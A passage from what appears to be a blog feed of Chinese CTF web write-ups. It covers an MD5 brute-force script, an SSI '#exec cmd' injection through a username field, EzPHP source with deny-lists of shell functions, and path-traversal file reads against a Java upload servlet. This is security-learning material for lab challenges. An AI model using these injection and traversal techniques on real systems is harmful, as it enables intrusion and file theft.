text/html;charset=utf-8"</span>);</span><br><span class="line">***</span><br><span class="line">    <span class="keyword">if</span>(<span class="keyword">isset</span>($_POST[<span class="string">'username'</span>]) <span class="keyword">and</span> $_POST[<span class="string">'username'</span>] != <span class="string">''</span> )</span><br><span class="line">    &#123;</span><br><span class="line">        $admin = <span class="string">'6d0bc1'</span>;</span><br><span class="line">        <span class="keyword">if</span> ( $admin == substr(md5($_POST[<span class="string">'password'</span>]),<span class="number">0</span>,<span class="number">6</span>)) &#123;</span><br><span class="line">            <span class="keyword">echo</span> <span class="string">"&lt;script&gt;alert('[+] Welcome to manage system')&lt;/script&gt;"</span>;</span><br><span class="line">            $file_shtml = <span class="string">"public/"</span>.get_hash().<span class="string">".shtml"</span>;</span><br><span class="line">            $shtml = fopen($file_shtml, <span class="string">"w"</span>) <span class="keyword">or</span> <span class="keyword">die</span>(<span class="string">"Unable to open file!"</span>);</span><br><span class="line">            $text = <span class="string">'</span></span><br><span class="line"><span class="string">            ***</span></span><br><span class="line"><span class="string">            ***</span></span><br><span class="line"><span class="string">            &lt;h1&gt;Hello,'</span>.$_POST[<span class="string">'username'</span>].<span class="string">'&lt;/h1&gt;</span></span><br><span class="line"><span class="string">            ***</span></span><br><span class="line"><span class="string">***'</span>;</span><br><span class="line">            fwrite($shtml,$text);</span><br><span class="line">            fclose($shtml);</span><br><span class="line">            ***</span><br><span class="line"><span class="keyword">echo</span> <span class="string">"[!] Header  error ..."</span>;</span><br><span class="line">        &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">            <span class="keyword">echo</span> <span class="string">"&lt;script&gt;alert('[!] Failed')&lt;/script&gt;"</span>;</span><br><span class="line">            </span><br><span class="line">    &#125;<span class="keyword">else</span></span><br><span class="line">    &#123;</span><br><span class="line">***</span><br><span class="line">    &#125;</span><br><span class="line">***</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><p>首先附上爆棚md5脚本(python写出来总是出错)</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="keyword">for</span>($i=<span class="number">0</span>;$i&lt;=<span class="number">1000000000</span>;$i++)</span><br><span class="line">&#123;</span><br><span class="line">    <span class="keyword">if</span>(strcmp(md5($i),<span class="string">'6d0bc1'</span>)==<span class="number">26</span>)</span><br><span class="line">    &#123;</span><br><span class="line">        var_dump($i);  </span><br><span class="line">      <span class="keyword">break</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;  </span><br><span class="line"><span class="comment">//int(2020666)</span></span><br></pre></td></tr></table></figure><p>username数据会被写入到文件中，文件是shtml，百度一波寻找漏洞</p><p><a href="https://www.xuebuyuan.com/693626.html" target="_blank" rel="noopener">ssi语法</a></p><p>直接读取根目录`/flag文件发现flag不存在，于是查看目录，发现flag在当前文件下。</p><p>username输入</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&lt;!--#exec cmd&#x3D;&quot;ls ..&#x2F;&quot;--&gt;</span><br></pre></td></tr></table></figure><p>随后访问shtml文件</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">Hello,flag_990c66bf85a09c664f0b6741840499b2 index.php index.php.swp public</span><br></pre></td></tr></table></figure><p>直接访问flag_990c66bf85a09c664f0b6741840499b2文件即可</p><h2 id="未完成-EzPHP"><a href="#未完成-EzPHP" class="headerlink" title="[未完成]EzPHP"></a>[未完成]EzPHP</h2><p>查看源码发现提示</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">&lt;!-- Here is the real page &#x3D;w&#x3D; --&gt;</span><br><span class="line">&lt;!-- GFXEIM3YFZYGQ4A&#x3D; --&gt;</span><br></pre></td></tr></table></figure><p>base32解码后得到<code>1nD3x.php</code></p><p>访问即可得到源码</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line">highlight_file(__FILE__);</span><br><span class="line">error_reporting(0); </span><br><span class="line"></span><br><span class="line">$file &#x3D; &quot;1nD3x.php&quot;;</span><br><span class="line">$shana &#x3D; $_GET[&#39;shana&#39;];</span><br><span class="line">$passwd &#x3D; $_GET[&#39;passwd&#39;];</span><br><span class="line">$arg &#x3D; &#39;&#39;;</span><br><span class="line">$code &#x3D; &#39;&#39;;</span><br><span class="line"></span><br><span class="line">echo &quot;&lt;br &#x2F;&gt;&lt;font color&#x3D;red&gt;&lt;B&gt;This is a very simple challenge and if you solve it I will give you a flag. Good Luck!&lt;&#x2F;B&gt;&lt;br&gt;&lt;&#x2F;font&gt;&quot;;</span><br><span class="line"></span><br><span class="line">if($_SERVER) &#123; </span><br><span class="line">    if (</span><br><span class="line">        preg_match(&#39;&#x2F;shana|debu|aqua|cute|arg|code|flag|system|exec|passwd|ass|eval|sort|shell|ob|start|mail|\$|sou|show|cont|high|reverse|flip|rand|scan|chr|local|sess|id|source|arra|head|light|read|inc|info|bin|hex|oct|echo|print|pi|\.|\&quot;|\&#39;|log&#x2F;i&#39;, $_SERVER[&#39;QUERY_STRING&#39;])</span><br><span class="line">        )  </span><br><span class="line">        die(&#39;You seem to want to do something bad?&#39;); </span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">if (!preg_match(&#39;&#x2F;http|https&#x2F;i&#39;, $_GET[&#39;file&#39;])) &#123;</span><br><span class="line">    if (preg_match(&#39;&#x2F;^aqua_is_cute$&#x2F;&#39;, $_GET[&#39;debu&#39;]) &amp;&amp; $_GET[&#39;debu&#39;] !&#x3D;&#x3D; &#39;aqua_is_cute&#39;) &#123; </span><br><span class="line">        $file &#x3D; $_GET[&quot;file&quot;]; </span><br><span class="line">        echo &quot;Neeeeee! Good Job!&lt;br&gt;&quot;;</span><br><span class="line">    &#125; </span><br><span class="line">&#125; else die(&#39;fxck you! What do you want to do ?!&#39;);</span><br><span class="line"></span><br><span class="line">if($_REQUEST) &#123; </span><br><span class="line">    foreach($_REQUEST as $value) &#123; </span><br><span class="line">        if(preg_match(&#39;&#x2F;[a-zA-Z]&#x2F;i&#39;, $value))  </span><br><span class="line">            die(&#39;fxck you! I hate English!&#39;); </span><br><span class="line">    &#125; </span><br><span class="line">&#125; </span><br><span class="line"></span><br><span class="line">if (file_get_contents($file) !&#x3D;&#x3D; &#39;debu_debu_aqua&#39;)</span><br><span class="line">    die(&quot;Aqua is the cutest five-year-old child in the world! Isn&#39;t it ?&lt;br&gt;&quot;);</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">if ( sha1($shana) &#x3D;&#x3D;&#x3D; sha1($passwd) &amp;&amp; $shana !&#x3D; $passwd )&#123;</span><br><span class="line">    extract($_GET[&quot;flag&quot;]);</span><br><span class="line">    echo &quot;Very good! you know my password. But what is flag?&lt;br&gt;&quot;;</span><br><span class="line">&#125; else&#123;</span><br><span class="line">    die(&quot;fxck you! you don&#39;t know my password! And you don&#39;t know sha1! why you come here!&quot;);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">if(preg_match(&#39;&#x2F;^[a-z0-9]*$&#x2F;isD&#39;, $code) || </span><br><span class="line">preg_match(&#39;&#x2F;fil|cat|more|tail|tac|less|head|nl|tailf|ass|eval|sort|shell|ob|start|mail|\&#96;|\&#123;|\%|x|\&amp;|\$|\*|\||\&lt;|\&quot;|\&#39;|\&#x3D;|\?|sou|show|cont|high|reverse|flip|rand|scan|chr|local|sess|id|source|arra|head|light|print|echo|read|inc|flag|1f|info|bin|hex|oct|pi|con|rot|input|\.|log|\^&#x2F;i&#39;, $arg) ) &#123; </span><br><span class="line">    die(&quot;&lt;br &#x2F;&gt;Neeeeee~! I have disabled all dangerous functions! You can&#39;t get my flag &#x3D;w&#x3D;&quot;); </span><br><span class="line">&#125; else &#123; </span><br><span class="line">    include &quot;flag.php&quot;;</span><br><span class="line">    $code(&#39;&#39;, $arg); </span><br><span class="line">&#125; ?&gt;</span><br><span class="line">This is a very simple challenge and if you solve it I will give you a flag. Good Luck!</span><br><span class="line">Aqua is the cutest five-year-old child in the world! Isn&#39;t it ?</span><br></pre></td></tr></table></figure>]]></content>
    
    <summary type="html">
    
      &lt;h1 id=&quot;web&quot;&gt;&lt;a href=&quot;#web&quot; class=&quot;headerlink&quot; title=&quot;web&quot;&gt;&lt;/a&gt;web&lt;/h1&gt;&lt;h2 id=&quot;Easy-MD5&quot;&gt;&lt;a href=&quot;#Easy-MD5&quot; class=&quot;headerlink&quot; title=&quot;Easy MD5&quot;&gt;&lt;/a&gt;Easy MD5&lt;/h2&gt;&lt;p&gt;在题目返回的http header中给出了提示&lt;/p&gt;
&lt;figure class=&quot;highlight plain&quot;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&quot;gutter&quot;&gt;&lt;pre&gt;&lt;span class=&quot;line&quot;&gt;1&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;td class=&quot;code&quot;&gt;&lt;pre&gt;&lt;span class=&quot;line&quot;&gt;select * from &amp;#39;admin&amp;#39; where password&amp;#x3D;md5($pass,true)&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;

&lt;p&gt;要使得某个字符串的md5值转字符串后出现形如 &lt;code&gt;&amp;#39;or&amp;#39;1&lt;/code&gt;&lt;/p&gt;
    
    </summary>
    
    
      <category term="刷题记录" scheme="https://sunny250.github.io/categories/%E5%88%B7%E9%A2%98%E8%AE%B0%E5%BD%95/"/>
    
    
      <category term="ctf" scheme="https://sunny250.github.io/tags/ctf/"/>
    
      <category term="web" scheme="https://sunny250.github.io/tags/web/"/>
    
  </entry>
  
  <entry>
    <title>网鼎杯2020记录</title>
    <link href="https://sunny250.github.io/2020/05/11/%E7%BD%91%E9%BC%8E%E6%9D%AF2020%E8%AE%B0%E5%BD%95/"/>
    <id>https://sunny250.github.io/2020/05/11/%E7%BD%91%E9%BC%8E%E6%9D%AF2020%E8%AE%B0%E5%BD%95/</id>
    <published>2020-05-10T16:09:53.000Z</published>
    <updated>2020-05-10T16:09:53.000Z</updated>
    
    <content type="html"><![CDATA[<h1 id="web"><a href="#web" class="headerlink" title="web"></a>web</h1><h2 id="青龙组-filejava"><a href="#青龙组-filejava" class="headerlink" title="青龙组 filejava"></a>青龙组 filejava</h2><p>上传一个文件后得到下载地址，下载地址可以随意读取文件，读取为目录时报错，得到绝对路径</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">java.io.FileNotFoundException: &#x2F;usr&#x2F;local&#x2F;tomcat&#x2F;webapps&#x2F;ROOT&#x2F;WEB-INF&#x2F;upload&#x2F;15&#x2F;12&#x2F;..&#x2F;..&#x2F;.. (Is a directory)</span><br><span class="line">java.io.FileInputStream.open0(Native Method)</span><br><span class="line">java.io.FileInputStream.open(FileInputStream.java:195)</span><br><span class="line">java.io.FileInputStream.&lt;init&gt;(FileInputStream.java:138)</span><br><span class="line">java.io.FileInputStream.&lt;init&gt;(FileInputStream.java:93)</span><br><span class="line">cn.abc.servlet.DownloadServlet.doPost(DownloadServlet.java:43)</span><br><span class="line">cn.abc.servlet.DownloadServlet.doGet(DownloadServlet.java:22)</span><br><span class="line">javax.servlet.http.HttpServlet.service(HttpServlet.java:634)</span><br><span class="line">javax.servlet.http.HttpServlet.service(HttpServlet.java:741)</span><br><span class="line">org.apache.tomcat.websocket.server.WsFilter.doFilter(WsFilter.java:52)</span><br></pre></td></tr></table></figure><p>读取web.xml文件</p><figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?xml version="1.0" encoding="UTF-8"?&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">web-app</span> <span class="attr">xmlns</span>=<span class="string">"http://xmlns.jcp.org/xml/ns/javaee"</span></span></span><br><span class="line"><span class="tag">         <span class="attr">xmlns:xsi</span>=<span class="string">"http://www.w3.org/2001/XMLSchema-instance"</span></span></span><br><span class="line"><span class="tag">         <span class="attr">xsi:schemaLocation</span>=<span class="string">"http://xmlns.jcp.org/xml/ns/javaee http://xmlns.jcp.org/xml/ns/javaee/web-app_4_0.xsd"</span></span></span><br><span class="line"><span class="tag">         <span class="attr">version</span>=<span class="string">"4.0"</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">servlet</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">servlet-name</span>&gt;</span>DownloadServlet<span class="tag">&lt;/<span class="name">servlet-name</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">servlet-class</span>&gt;</span>cn.abc.servlet.DownloadServlet<span class="tag">&lt;/<span class="name">servlet-class</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;/<span class="name">servlet</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">servlet-mapping</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">servlet-name</span>&gt;</span>DownloadServlet<span class="tag">&lt;/<span class="name">servlet-name</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">url-pattern</span>&gt;</span>/DownloadServlet<span class="tag">&lt;/<span class="name">url-pattern</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;/<span class="name">servlet-mapping</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">servlet</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">servlet-name</span>&gt;</span>ListFileServlet<span class="tag">&lt;/<span class="name">servlet-name</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">servlet-class</span>&gt;</span>cn.abc.servlet.ListFileServlet<span class="tag">&lt;/<span class="name">servlet-class</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;/<span class="name">servlet</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">servlet-mapping</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">servlet-name</span>&gt;</span>ListFileServlet<span class="tag">&lt;/<span class="name">servlet-name</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">url-pattern</span>&gt;</span>/ListFileServlet<span class="tag">&lt;/<span class="name">url-pattern</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;/<span class="name">servlet-mapping</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">servlet</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">servlet-name</span>&gt;</span>UploadServlet<span class="tag">&lt;/<span class="name">servlet-name</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">servlet-class</span>&gt;</span>cn.abc.servlet.UploadServlet<span class="tag">&lt;/<span class="name">servlet-class</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;/<span class="name">servlet</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">servlet-mapping</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">servlet-name</span>&gt;</span>UploadServlet<span class="tag">&lt;/<span class="name">servlet-name</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">url-pattern</span>&gt;</span>/UploadServlet<span class="tag">&lt;/<span class="name">url-pattern</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;/<span class="name">servlet-mapping</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">web-app</span>&gt;</span></span><br></pre></td></tr></table></figure><p><del>读取upload.jsp时候发现提示，flag在/flag中</del>比赛时可以读到，buu读不到。</p><p>根据web.xml下载java文件进行审计</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">//DownloadServlet.class</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">package</span> cn.abc.servlet;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> java.io.File;</span><br><span class="line"><span class="keyword">import</span> java.io.FileInputStream;</span><br><span class="line"><span class="keyword">import</span> java.io.IOException;</span><br><span class="line"><span class="keyword">import</span> java.net.URLEncoder;</span><br><span class="line"><span class="keyword">import</span> javax.servlet.ServletException;</span><br><span class="line"><span class="keyword">import</span> javax.servlet.ServletOutputStream;</span><br><span class="line"><span class="keyword">import</span> javax.servlet.http.HttpServlet;</span><br><span class="line"><span class="keyword">import</span> javax.servlet.http.HttpServletRequest;</span><br><span class="line"><span class="keyword">import</span> javax.servlet.http.HttpServletResponse;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">DownloadServlet</span> <span class="keyword">extends</span> <span class="title">HttpServlet</span> </span>&#123;</span><br><span class="line">    <span class="keyword">private</span> <span class="keyword">static</span> <span class="keyword">final</span> <span class="keyword">long</span> serialVersionUID = <span class="number">1L</span>;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="title">DownloadServlet</span><span class="params">()</span> </span>&#123;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">protected</span> <span class="keyword">void</span> <span class="title">doGet</span><span class="params">(HttpServletRequest request, HttpServletResponse response)</span> <span class="keyword">throws</span> ServletException, IOException </span>&#123;</span><br><span class="line">        <span class="keyword">this</span>.doPost(request, response);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">protected</span> <span class="keyword">void</span> <span class="title">doPost</span><span class="params">(HttpServletRequest request, HttpServletResponse response)</span> <span class="keyword">throws</span> ServletException, IOException </span>&#123;</span><br><span class="line">        String fileName = request.getParameter(<span class="string">"filename"</span>);</span><br><span class="line">        fileName = <span class="keyword">new</span> String(fileName.getBytes(<span class="string">"ISO8859-1"</span>), <span class="string">"UTF-8"</span>);</span><br><span class="line">        System.out.println(<span class="string">"filename="</span> + fileName);</span><br><span class="line">        <span class="keyword">if</span> (fileName != <span class="keyword">null</span> &amp;&amp; fileName.toLowerCase().contains(<span class="string">"flag"</span>)) &#123;</span><br><span class="line">            request.setAttribute(<span class="string">"message"</span>, <span class="string">"禁止读取"</span>);</span><br><span class="line">            request.getRequestDispatcher(<span class="string">"/message.jsp"</span>).forward(request, response);</span><br><span class="line">        &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">            String fileSaveRootPath = <span class="keyword">this</span>.getServletContext().getRealPath(<span class="string">"/WEB-INF/upload"</span>);</span><br><span class="line">            String path = <span class="keyword">this</span>.findFileSavePathByFileName(fileName, fileSaveRootPath);</span><br><span class="line">            File file = <span class="keyword">new</span> File(path + <span class="string">"/"</span> + fileName);</span><br><span class="line">            <span class="keyword">if</span> (!file.exists()) &#123;</span><br><span class="line">                request.setAttribute(<span class="string">"message"</span>, <span class="string">"您要下载的资源已被删除!"</span>);</span><br><span class="line">                request.getRequestDispatcher(<span class="string">"/message.jsp"</span>).forward(request, response);</span><br><span class="line">            &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">                String realname = fileName.substring(fileName.indexOf(<span class="string">"_"</span>) + <span class="number">1</span>);</span><br><span class="line">                response.setHeader(<span class="string">"content-disposition"</span>, <span class="string">"attachment;filename="</span> + URLEncoder.encode(realname, <span class="string">"UTF-8"</span>));</span><br><span class="line">                FileInputStream in = <span class="keyword">new</span> FileInputStream(path + <span class="string">"/"</span> + fileName);</span><br><span class="line">                ServletOutputStream out = response.getOutputStream();</span><br><span class="line">                <span class="keyword">byte</span>[] buffer = <span class="keyword">new</span> <span class="keyword">byte</span>[<span class="number">1024</span>];</span><br><span class="line">                <span class="keyword">boolean</span> var11 = <span class="keyword">false</span>;</span><br><span class="line"></span><br><span class="line">                <span class="keyword">int</span> len;</span><br><span class="line">                <span class="keyword">while</span>((len = in.read(buffer)) &gt; <span class="number">0</span>) &#123;</span><br><span class="line">                    out.write(buffer, <span class="number">0</span>, len);</span><br><span class="line">                &#125;</span><br><span class="line"></span><br><span class="line">                in.close();</span><br><span class="line">                out.close();</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">public</span> String <span class="title">findFileSavePathByFileName</span><span class="params">(String filename, String saveRootPath)</span> </span>&#123;</span><br><span class="line">        <span class="keyword">int</span> hashCode = filename.hashCode();</span><br><span class="line">        <span class="keyword">int</span> dir1 = hashCode &amp; <span class="number">15</span>;</span><br><span class="line">        <span class="keyword">int</span> dir2 = (hashCode &amp; <span class="number">240</span>) &gt;&gt; <span class="number">4</span>;</span><br><span class="line">        String dir = saveRootPath + <span class="string">"/"</span> + dir1 + <span class="string">"/"</span> + dir2;</span><br><span class="line">        File file = <span class="keyword">new</span> File(dir);</span><br><span class="line">        <span class="keyword">if</span> (!file.exists()) &#123;</span><br><span class="line">            file.mkdirs();</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">return</span> dir;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">//ListFileServlet.class</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">package</span> cn.abc.servlet;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> java.io.IOException;</span><br><span class="line"><span class="keyword">import</span> java.util.HashMap;</span><br><span class="line"><span class="keyword">import</span> java.util.Map;</span><br><span class="line"><span class="keyword">import</span> javax.servlet.ServletException;</span><br><span class="line"><span class="keyword">import</span> javax.servlet.http.HttpServlet;</span><br><span class="line"><span class="keyword">import</span> javax.servlet.http.HttpServletRequest;</span><br><span class="line"><span class="keyword">import</span> javax.servlet.http.HttpServletResponse;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">ListFileServlet</span> <span class="keyword">extends</span> <span class="title">HttpServlet</span> </span>&#123;</span><br><span class="line">    <span class="keyword">private</span> <span class="keyword">static</span> <span class="keyword">final</span> <span class="keyword">long</span> serialVersionUID = <span class="number">1L</span>;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="title">ListFileServlet</span><span class="params">()</span> </span>&#123;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">protected</span> <span class="keyword">void</span> <span class="title">doGet</span><span class="params">(HttpServletRequest request, HttpServletResponse response)</span> <span class="keyword">throws</span> ServletException, IOException </span>&#123;</span><br><span class="line">        <span class="keyword">this</span>.doPost(request, response);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">protected</span> <span class="keyword">void</span> <span class="title">doPost</span><span class="params">(HttpServletRequest request, HttpServletResponse response)</span> <span class="keyword">throws</span> ServletException, IOException </span>&#123;</span><br><span class="line">        String uploadFilePath = <span class="keyword">this</span>.getServletContext().getRealPath(<span class="string">"/WEB-INF/upload"</span>);</span><br><span class="line">        Map&lt;String, String&gt; fileNameMap = <span class="keyword">new</span> HashMap();</span><br><span class="line">        String saveFilename = (String)request.getAttribute(<span class="string">"saveFilename"</span>);</span><br><span class="line">        String filename = (String)request.getAttribute(<span class="string">"filename"</span>);</span><br><span class="line">        System.out.println(<span class="string">"saveFilename"</span> + saveFilename);</span><br><span class="line">        System.out.println(<span class="string">"filename"</span> + filename);</span><br><span class="line">        saveFilename.substring(saveFilename.indexOf(<span class="string">"_"</span>) + <span class="number">1</span>);</span><br><span class="line">        fileNameMap.put(saveFilename, filename);</span><br><span class="line">        request.setAttribute(<span class="string">"fileNameMap"</span>, fileNameMap);</span><br><span class="line">        request.getRequestDispatcher(<span class="string">"/listfile.jsp"</span>).forward(request, response);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span 